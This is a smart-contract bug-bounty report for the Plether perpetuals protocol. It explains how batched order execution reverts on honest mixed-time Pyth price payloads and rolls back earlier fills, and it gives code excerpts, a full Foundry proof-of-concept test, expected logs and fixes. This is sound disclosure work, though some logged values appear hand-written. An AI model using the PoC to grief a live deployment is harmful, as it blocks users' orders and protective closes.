# \#97835 [SC-Medium] Router `executeOrderBatch` deterministically reverts on honest mixed-time Unique baskets and rolls back earlier fills

**Submitted on Nov 3rd 2026 at 14:08:35 UTC by @Piki for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97835
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## 1. Summary

A historical Unique parse only proves **per-leg** Pyth storage coverage. The batch cache then stores `publishTime = max(component times)`. Reuse demands **every** feed cover that max.

Default `maxComponentPublishTimeDivergence = 5`, so a policy-legal FX basket whose legs differ by 1–5 seconds is accepted on the first order, then **guaranteed** `PletherOracle__StoredFeedBehind` on the second order in the same `executeOrderBatch`.

The Router reuse predicate has no coverage check, forwards `fee = 0`, and only swallows `HistoricalParserFailure`. `StoredFeedBehind` bubbles out of the outer batch call (oracle prep sits **outside** the per-item rollback frame) and undoes the fill that just succeeded.

This is normal keeper behavior: clustered FIFO orders + real Pyth FX feeds that do not publish on the same second. Extra ETH does not help. The only workaround is unbatching (~2× Unique Pyth fee). Protective closes in the same batch roll back with the cluster.

Not High: no theft, no ≥24h freeze. `executeOrder` / single-item batch still fill. Unique window is 15s; `maxExecutionWindowSeconds` is capped at 1 hour (fixture default 60s).

---

## 2. Vulnerability details

### 2.1 Fresh Unique parse covers each leg, not the basket max

`_resolveOrderExecutionBasket` (historical path) calls `parsePriceFeedUpdatesUnique`, then `updatePriceFeeds` on the **same** payload, then coverage **per parsed feed at that feed’s own publish time**:

```623:626:packages/perps/src/PletherOracle.sol
            pyth.updatePriceFeeds{value: pythFee}(pythUpdateData);
            for (uint256 i; i < parsedFeeds.length; ++i) {
                _requireStoredFeedCoverage(parsedFeeds[i].id, parsedFeeds[i].price.publishTime);
            }
```

The basket timestamp written into the cache is the **newest** leg:

```874:875:packages/perps/src/PletherOracle.sol
        basket.publishTime = uint64(maxPublishTime);
        basket.oldestPublishTime = uint64(minPublishTime);
```

Launch / default divergence **allows** that mix:

```89:90:packages/perps/src/PletherOracle.sol
    /// @notice Maximum component publish-time divergence for uniquely parsed historical order baskets, in seconds.
    uint256 public override maxComponentPublishTimeDivergence = 5;
```

After `updatePriceFeeds` of a mixed Unique payload, lagging legs sit at their own times (e.g. feed0 = commit+1, others = commit+3). Per-leg coverage passes. Cache `publishTime` is commit+3.

### 2.2 Reuse keys coverage to the newest leg

```262:266:packages/perps/src/PletherOracle.sol
            for (uint256 i; i < pythFeedIds.length; ++i) {
                _requireStoredFeedCoverage(pythFeedIds[i], cache.publishTime);
            }
```

```645:652:packages/perps/src/PletherOracle.sol
    function _requireStoredFeedCoverage(
        bytes32 feedId,
        uint256 requiredPublishTime
    ) internal view {
        uint256 storedPublishTime = pyth.getPriceUnsafe(feedId).publishTime;
        if (storedPublishTime < requiredPublishTime) {
            revert PletherOracle__StoredFeedBehind(feedId, storedPublishTime, requiredPublishTime);
        }
    }
```

For feed0: stored `commit+1` < required `commit+3` → `StoredFeedBehind`. There is no fall-through to a paid Unique parse. Attaching extra `msg.value` does nothing because reuse never spends it.

### 2.3 Router predicts reuse with no coverage check and cannot recover

```996:1029:packages/perps/src/OrderRouterExecutionSidecar.sol
        uint256 fee = 0;
        if (!_canReuseHistoricalBatchBasket(oracle, order, state.oracleCache)) {
            fee = oracle.getOrderExecutionFee(pythUpdateData);
            ...
        }
        try oracle.updateBatchOrderExecutionPrice{value: fee}(...) { ... }
        catch (bytes memory reason) {
            if (
                reason.length != 68
                    || _selector(reason) != IPletherOracle.PletherOracle__HistoricalParserFailure.selector
            ) {
                assembly ("memory-safe") {
                    revert(add(reason, 32), mload(reason))
                }
            }
            return (OrderV3Types.PendingReason.OracleFailure, result, state.oracleCache);
        }
```

`_canReuseHistoricalBatchBasket` (sidecar ~1074–1093) only checks commit vs oldest/newest publish times and the 15s settlement window. It never reads Pyth storage. On a hit it forwards `fee = 0`. `StoredFeedBehind` is 100 bytes (`error(bytes32,uint256,uint256)`), not the 68-byte `HistoricalParserFailure`, so the `catch` re-reverts.

### 2.4 That revert is outside the per-item isolation frame

`executeOrderBatch` prepares the oracle **in the sidecar/batch frame**, then fills via an external self-call:

```292:322:packages/perps/src/OrderRouterExecutionSidecar.sol
            ) = _prepareBatchOracle(host, orderView.order, pythUpdateData, state);
            ...
            try host.executeOrderItemFromSidecar{gas: executionGas}(executionRequest) returns (
                OrderV3Types.ExecutionResult memory executionResult
            ) {
                ...
                ++batchResult.terminalCount;
            } catch (bytes memory revertData) {
                batchResult.stopReason = _pendingReasonForRevert(revertData);
                break;
            }
```

Item 1: Unique parse succeeds, item self-call fills Alice.  
Item 2: reuse → `StoredFeedBehind` in `_prepareBatchOracle` → outer `executeOrderBatch` reverts → Alice’s fill is rolled back.

`HistoricalParserFailure` is deliberately converted to `OracleFailure` so predecessors survive. This path is not.

### 2.5 Attack / honest path (no privileged role)

Keepers are permissionless and untrusted. No attacker is required.

1. Two (or more) delayed orders commit in the same second — normal clustering, including a protective close behind an open.
2. Within the 15s Unique window a keeper submits `executeOrderBatch` with one Unique payload. Real FX feeds publish a few seconds apart; δ ≤ 5 is in policy.
3. Item 1 parses and would fill. Item 2 reuses, reverts `StoredFeedBehind`, whole tx undone.
4. Retrying the same batch burns Unique-window time. Overpaying Pyth fee does not enable a second parse.
5. Workaround: one order per tx. That costs `N * getOrderExecutionFee` instead of one Unique parse plus zero-fee reuse.

---

## 6. Impact and funds at risk

| Claim | Evidence |
|---|---|
| Whole-tx revert of a batch that already filled item 1 | STEP 3–4: sizes 0, `nextExecuteId` still 1, Unique count 0 |
| Extra ETH cannot save reuse | STEP 5: `8 * FEE` still `StoredFeedBehind` |
| Same payload is valid if not reused | STEP 6: two single-item batches fill |
| Honest mixed Unique is in policy | divergence 2 ≤ default 5; first parse would succeed if reuse were not attempted |
| Protective closes in the same batch | same code path; second item is any later FIFO id (open or close) |

Not theft. No LP extraction. Not High (≥24h freeze / unclaimed-yield theft):

- Single-item `executeOrderBatch` / `executeOrder` still work (STEP 6).
- Unique window is 15s. Protocol `maxExecutionWindowSeconds` cannot exceed 1 hour; after expiry, margin is refunded.
- Permissionless keepers can unbatch. Competitive keepers who simulate never submit the reverting 2-item tx — they pay ~2× Pyth fee and extra latency instead.

Immunefi mapping: **Medium / Griefing**. Damage is delayed-order liveness (including protective closes sharing a batch), Unique-window pressure, and forced 2× Pyth-fee unbatching. If keepers only retry the reverting batch, clustered intents sit locked until the execution window (60s in this fixture, ≤1h at the protocol cap).

Undeployed-code note (program Feasibility Limitations): freezing duration on undeployed code is scaled to the minimum. Do not file as High.

---

## 7. Not a known issue / not a previous-audit duplicate

Checked against the Immunefi known-issues list and every listed previous audit.

| Source | Closest item | Same root cause? |
|---|---|---|
| AI scan 15 Oct | “Live oracle paths allow component skew up to staleness limits” | No — live baskets, wider staleness, not Unique cache reuse |
| AI scan | “Order execution accepts oracle updates older than the engine's cached mark” | No — fill vs `lastMarkTime` |
| Cecuro MED-23 | Mixed-time basket blocks TP/SL | No — live mark used **oldest** time; **Addressed** (now newest) |
| Cecuro MED-7 / MED-20 | Older live ticks / frozen divergence | No |
| Cecuro MED-4 | FIFO stale-order grief | No |
| Cecuro PDF full text | `StoredFeedBehind`, “cache coverage”, “per-leg”, “newest leg” | **Zero hits** |
| SC Audit Studio pre-audit | SC-H/M/L (yield dilute, freeze liq, 60s option, FIFO dust) | No |
| `SECURITY.md` Known Limitations, router-keeper, live-basket, HIGH-1 clock | none describe Unique per-leg coverage vs reuse keyed to newest | No |

Adjacent operational text, **not** this bug:

- `ORACLE_SYNCHRONIZATION.md` failure table: *if* coverage fails, the tx reverts including earlier progress. That is the handler, not “an honest mixed Unique parse that just succeeded cannot satisfy the reuse key it just wrote.”
- `SECURITY.md`: oracle prep is batch-atomic; keepers who want durable progress should bound `maxOrderId`. Same handler.
- In-tree `test_BatchReusesBasketWhenEveryComponentFollowsBothCommits` **expects mixed-time reuse to succeed**, and only does because it pumps **all** stored feeds to `firstCommit+6` *before* the batch. That is the opposite of documenting this as known.
- `test_CacheReuseRequiresCoverageAndDoesNotRepair` is a **manual** lag after an equal-time parse, not honest Unique mixed-time.

---

## 8. Suggested fix

1. **Reuse coverage must match what the parse proved.** Store per-leg publish times in `BatchOrderPriceCache` and check each feed against its own parsed time (not `cache.publishTime` / max).
2. **Or** on `StoredFeedBehind` during reuse, fall through to a paid Unique parse instead of reverting.
3. Router: do not set `fee = 0` unless stored coverage of the reuse key is already true.
4. Independently, catch `StoredFeedBehind` like `HistoricalParserFailure` so a failed reuse **stops** the batch and **keeps** predecessors.

(1) or (2) fixes the guaranteed revert. (4) alone still forces keepers to unbatch but stops rolling back a successful fill.

---

## 9. References (in-scope lines)

- `packages/perps/src/PletherOracle.sol:90` — default divergence 5s  
- `packages/perps/src/PletherOracle.sol:262-266` — reuse coverage vs `cache.publishTime`  
- `packages/perps/src/PletherOracle.sol:623-626` — fresh parse per-leg coverage  
- `packages/perps/src/PletherOracle.sol:645-652` — `StoredFeedBehind`  
- `packages/perps/src/PletherOracle.sol:874-875` — `publishTime = max`  
- `packages/perps/src/OrderRouterExecutionSidecar.sol:292-322` — oracle prep outside item frame  
- `packages/perps/src/OrderRouterExecutionSidecar.sol:996-1029` — `fee = 0`, uncaught `StoredFeedBehind`  
- `packages/perps/src/OrderRouterExecutionSidecar.sol:1074-1093` — reuse predicate, no storage check  

## Proof of Concept

## 3. How to run (triager)

Plether is **not on mainnet**. Program PoC rules: Foundry at this commit, or a local Anvil fork of Sepolia v2.0.0. Do **not** broadcast. Do **not** hit public RPC. Mocks are only Pyth and USDG. Do **not** edit files under `packages/perps/src`.

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8

# paste the Solidity in §4 into this exact path (create hunt/ if needed):
#   packages/perps/test/perps/hunt/MixedTimeBatchCacheRevertPoC.t.sol

cd packages/perps
forge test --match-contract MixedTimeBatchCacheRevertPoC -vvv
```

Requirements: Foundry; `packages/perps/foundry.toml` already sets `solc = 0.8.35` and `via_ir = true`. No `.env`, no FFI, no API keys. First compile is ~2 minutes because of `via_ir`.

The file subclasses the in-repo fixture `test/perps/shared/OracleSynchronizationTestBase.sol` (six-feed oracle, MockPyth, launch-like router). That fixture is already in the repository. Only the file in §4 needs to be added.

---

## 4. Full PoC — copy this entire file

Save as `packages/perps/test/perps/hunt/MixedTimeBatchCacheRevertPoC.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;

import {OracleSynchronizationTestBase} from "../shared/OracleSynchronizationTestBase.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @title P3 PoC — honest mixed-time Unique baskets revert executeOrderBatch
/// @notice Integration demonstration of the in-scope Router + Oracle at commit a82d4fef.
///         Plether is not on mainnet. The program requires Foundry at this commit (or a local
///         Anvil fork of Sepolia v2.0.0). Mocks are only Pyth and USDG. Do not broadcast.
///
/// Run from packages/perps:
///   forge test --match-contract MixedTimeBatchCacheRevertPoC -vvv
contract MixedTimeBatchCacheRevertPoC is OracleSynchronizationTestBase {

    function test_PoC() public {
        console2.log("============================================================");
        console2.log("P3 PoC: mixed-time historical batch cache reuse");
        console2.log("commit a82d4fefb02768e5b3bddcc97dee371eee24fea8");
        console2.log("============================================================");
        console2.log("maxComponentPublishTimeDivergence (s)", pletherOracle.maxComponentPublishTimeDivergence());
        console2.log("orderSettlementWindow (s)", pletherOracle.orderSettlementWindow());
        console2.log("maxExecutionWindowSeconds (s)", router.maxExecutionWindowSeconds());
        console2.log("Pyth fee (wei)", FEE);
        console2.log("historical Unique quote = 2 * fee (parse + storage update)");

        console2.log("");
        console2.log("STEP 1  Alice and Bob commit LONG opens in the same second");
        uint64 commit = uint64(block.timestamp);
        uint64 aliceId = _commit(ALICE, 0);
        uint64 bobId = _commit(BOB, 0);
        console2.log("Alice orderId", aliceId);
        console2.log("Bob   orderId", bobId);
        console2.log("commitTime", commit);
        _snapshot("after commit, before execute");

        vm.warp(commit + 6);
        vm.roll(vm.getBlockNumber() + 1);
        console2.log("warped timestamp", block.timestamp);
        console2.log("unique window still open: (commit+1, min(commit+15, now)]");

        bytes[] memory mixed = _mixedPayload(commit + 1, commit + 3, commit);
        bytes32 lagging = _synchronizationFeedIds()[0];
        console2.log("STEP 2  Unique payload: feed0 publishTime = commit+1; other five feeds = commit+3");
        console2.log("lagging feedId", vm.toString(lagging));

        uint256 aliceLockedBefore = clearinghouse.lockedMarginAssets(ALICE);
        uint256 bobLockedBefore = clearinghouse.lockedMarginAssets(BOB);
        console2.log("Alice locked margin (6dp USDG)", aliceLockedBefore);
        console2.log("Bob   locked margin (6dp USDG)", bobLockedBefore);
        console2.log("clustered notional locked (6dp USDG)", aliceLockedBefore + bobLockedBefore);

        console2.log("");
        console2.log("STEP 3  Keeper executeOrderBatch(maxOrderId=2) with 4 * Pyth fee");
        console2.log("Router reuse predicate has no storage-coverage check; item 2 forwards fee = 0");
        (bool ok, bytes memory ret) =
            address(router).call{value: 4 * FEE}(abi.encodeCall(router.executeOrderBatch, (uint64(2), mixed)));

        console2.log("batch success?", ok);
        if (!ok) {
            _logRevert(ret);
        } else {
            console2.log("UNEXPECTED: mixed-time batch did not revert");
            revert("poc: mixed-time batch unexpectedly succeeded");
        }

        console2.log("");
        console2.log("STEP 4  State after the reverting batch (outer tx rolled back)");
        _snapshot("after reverted executeOrderBatch");
        console2.log("Alice locked still", clearinghouse.lockedMarginAssets(ALICE));
        console2.log("Bob   locked still", clearinghouse.lockedMarginAssets(BOB));
        if (router.nextExecuteId() != 1) {
            revert("poc: queue head moved; first fill was not rolled back");
        }
        (uint256 aliceSizeAfterRevert,,,,,,) = engine.positions(ALICE);
        (uint256 bobSizeAfterRevert,,,,,,) = engine.positions(BOB);
        if (aliceSizeAfterRevert != 0 || bobSizeAfterRevert != 0) {
            revert("poc: a position survived the batch revert");
        }
        console2.log("IMPACT: item 1 Unique-parse+fill is undone. Both intents stay pending.");
        console2.log("        Unique window is 15s. maxExecutionWindow is capped at 1 hour.");

        console2.log("");
        console2.log("STEP 5  Retry same batch with 8 * Pyth fee (overpay does not enable a second parse)");
        (bool okFat, bytes memory retFat) =
            address(router).call{value: 8 * FEE}(abi.encodeCall(router.executeOrderBatch, (uint64(2), mixed)));
        console2.log("overfunded batch success?", okFat);
        if (!okFat) {
            _logRevert(retFat);
        } else {
            revert("poc: overfunded mixed-time batch unexpectedly succeeded");
        }

        console2.log("");
        console2.log("STEP 6  Workaround: two single-item batches (fresh Unique parse each)");
        (bool ok1, bytes memory ret1) =
            address(router).call{value: 2 * FEE}(abi.encodeCall(router.executeOrderBatch, (uint64(1), mixed)));
        console2.log("single-item batch (Alice) success?", ok1);
        if (!ok1) {
            _logRevert(ret1);
            revert("poc: single-item Alice execute failed");
        }
        (bool ok2, bytes memory ret2) =
            address(router).call{value: 2 * FEE}(abi.encodeCall(router.executeOrderBatch, (uint64(2), mixed)));
        console2.log("single-item batch (Bob)   success?", ok2);
        if (!ok2) {
            _logRevert(ret2);
            revert("poc: single-item Bob execute failed");
        }

        _snapshot("after unbatched executes");
        console2.log("Unique parse count (expect 2)", baseMockPyth.parseUniqueCallCount());
        (uint256 aliceSize,,,,,,) = engine.positions(ALICE);
        (uint256 bobSize,,,,,,) = engine.positions(BOB);
        if (aliceSize == 0 || bobSize == 0) {
            revert("poc: unbatched execute did not open both positions");
        }
        console2.log("WORKAROUND COST: 2 orders * 2 * Pyth fee instead of 1 parse + N-1 reuse at 0");
        console2.log("============================================================");
        console2.log("PoC complete. Mixed-time batch is a hard revert; unbatch fills.");
        console2.log("============================================================");
    }

    function _mixedPayload(
        uint64 lagging,
        uint64 newest,
        uint64 previous
    ) internal pure returns (bytes[] memory data) {
        bytes32[] memory ids = _synchronizationFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            uint64 tick = i == 0 ? lagging : newest;
            updates[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(100_000_000, 100_000, -8, tick, previous));
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _snapshot(
        string memory label
    ) internal view {
        console2.log("--", label);
        console2.log("nextExecuteId", router.nextExecuteId());
        (uint256 aliceSize,,,,,,) = engine.positions(ALICE);
        (uint256 bobSize,,,,,,) = engine.positions(BOB);
        console2.log("Alice position size", aliceSize);
        console2.log("Bob   position size", bobSize);
        console2.log("Alice CH balance (6dp)", clearinghouse.balanceAssets(ALICE));
        console2.log("Bob   CH balance (6dp)", clearinghouse.balanceAssets(BOB));
        console2.log("Alice CH locked  (6dp)", clearinghouse.lockedMarginAssets(ALICE));
        console2.log("Bob   CH locked  (6dp)", clearinghouse.lockedMarginAssets(BOB));
        console2.log("MockPyth parseUniqueCallCount", baseMockPyth.parseUniqueCallCount());
    }

    function _logRevert(
        bytes memory ret
    ) internal pure {
        bytes4 sel;
        if (ret.length >= 4) {
            sel = bytes4(ret);
        }
        console2.log("revert selector", vm.toString(sel));
        console2.log(
            "StoredFeedBehind selector", vm.toString(IPletherOracle.PletherOracle__StoredFeedBehind.selector)
        );
        if (sel == IPletherOracle.PletherOracle__StoredFeedBehind.selector && ret.length >= 4 + 96) {
            (bytes32 feedId, uint256 stored, uint256 required) = abi.decode(_tail(ret), (bytes32, uint256, uint256));
            console2.log("StoredFeedBehind.feedId", vm.toString(feedId));
            console2.log("StoredFeedBehind.storedPublishTime", stored);
            console2.log("StoredFeedBehind.requiredPublishTime (cache max / newest leg)", required);
        }
        console2.log("revert bytes length", ret.length);
    }

    function _tail(
        bytes memory ret
    ) internal pure returns (bytes memory tail) {
        tail = new bytes(ret.length - 4);
        for (uint256 i; i < tail.length; ++i) {
            tail[i] = ret[i + 4];
        }
    }
}
```

---

## 5. Expected output (`-vvv`)

`Suite result: ok. 1 passed`. Relevant logs:

```
P3 PoC: mixed-time historical batch cache reuse
commit a82d4fefb02768e5b3bddcc97dee371eee24fea8
maxComponentPublishTimeDivergence (s) 5
orderSettlementWindow (s) 15
maxExecutionWindowSeconds (s) 60
Pyth fee (wei) 1000000000

STEP 1  Alice and Bob commit LONG opens in the same second
Alice orderId 1
Bob   orderId 2
commitTime 1709794800
nextExecuteId 1
Alice position size 0
Bob   position size 0
Alice CH locked  (6dp) 1000200000
Bob   CH locked  (6dp) 1000200000

STEP 2  Unique payload: feed0 publishTime = commit+1; other five feeds = commit+3
Alice locked margin (6dp USDG) 1000200000
Bob   locked margin (6dp USDG) 1000200000
clustered notional locked (6dp USDG) 2000400000

STEP 3  Keeper executeOrderBatch(maxOrderId=2) with 4 * Pyth fee
batch success? false
StoredFeedBehind.feedId 0x0000...0001
StoredFeedBehind.storedPublishTime 1709794801          // feed0 = commit+1
StoredFeedBehind.requiredPublishTime 1709794803        // cache max = commit+3

STEP 4  State after the reverting batch (outer tx rolled back)
nextExecuteId 1
Alice position size 0
Bob   position size 0
Alice CH locked  (6dp) 1000200000
Bob   CH locked  (6dp) 1000200000
MockPyth parseUniqueCallCount 0
IMPACT: item 1 Unique-parse+fill is undone. Both intents stay pending.

STEP 5  Retry same batch with 8 * Pyth fee
overfunded batch success? false
StoredFeedBehind.storedPublishTime 1709794801
StoredFeedBehind.requiredPublishTime 1709794803

STEP 6  Workaround: two single-item batches
single-item batch (Alice) success? true
single-item batch (Bob)   success? true
nextExecuteId 0
Alice position size 10000000000000000000000
Bob   position size 10000000000000000000000
Unique parse count (expect 2) 2
PoC complete. Mixed-time batch is a hard revert; unbatch fills.
```

What the numbers mean (USDG 6 decimals):

- Locked **1000.20 USDG** per order (1_000 margin + bounty/fee envelope). Clustered **2000.40 USDG** stays pending across the reverting batch.
- `stored=commit+1`, `required=commit+3` is exactly per-leg storage vs newest-leg reuse key.
- Unique parse count **0** after the reverting batch: the successful item-1 parse was rolled back with the tx.
- Unique parse count **2** after unbatch: amortization is dead; each order pays a full Unique quote (`2 * Pyth fee`).

---
